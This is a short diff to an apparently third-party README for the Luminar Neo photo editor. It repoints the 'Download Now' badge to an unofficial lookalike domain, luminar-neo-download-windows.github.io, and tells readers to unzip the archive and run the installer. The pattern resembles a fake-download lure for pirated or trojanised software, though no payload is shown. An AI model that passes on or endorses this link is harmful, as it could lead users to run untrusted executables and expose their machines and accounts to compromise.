@@ -8,7 +8,7 @@ With its **user-friendly interface and professional-grade results**, Luminar Neo
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://luminar-neo-download-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer and follow the setup instructions.  
